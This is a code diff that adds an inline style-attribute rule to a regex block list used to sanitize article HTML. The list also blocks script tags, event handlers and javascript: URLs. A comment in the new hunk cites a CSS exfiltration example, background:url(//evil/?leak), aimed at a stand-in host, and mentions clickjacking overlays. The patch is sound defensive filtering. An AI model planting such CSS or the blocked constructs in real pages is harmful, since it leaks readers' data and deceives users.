@@ -41,6 +41,12 @@ const unsafeContentPatterns = [
   { pattern: /<\s*\/\s*script\s*>/i, reason: 'script tags are not allowed in article content' },
   { pattern: /<\s*(base|frame|frameset|iframe|object|embed|link|meta|style|form|input|button|textarea|select|option|fieldset|legend|datalist|output)\b/i, reason: 'active HTML elements are not allowed in article content' },
   { pattern: /\sslot\s*=/i, reason: 'slot attributes are not allowed in article content' },
+  // The <style> element is already blocked above, but an inline `style=`
+  // attribute on any allowed element is the matching gap: it lets injected CSS
+  // exfiltrate data (`background:url(//evil/?leak)`), overlay/clickjack the page
+  // (`position:fixed`), or spoof content — all with no script, handler, or
+  // flagged scheme. Article bodies are plain prose, so the attribute is blocked.
+  { pattern: /\sstyle\s*=/i, reason: 'inline style attributes are not allowed in article content' },
   { pattern: /\sxmlns(?:\s*:\s*[\w-]+)?\s*=\s*/i, reason: 'xmlns attributes are not allowed in article content' },
   { pattern: /\son[a-z]+\s*=/i, reason: 'inline event handlers are not allowed in article content' },
   { pattern: /\bjavascript\s*:/i, reason: 'javascript: URLs are not allowed in article content' },
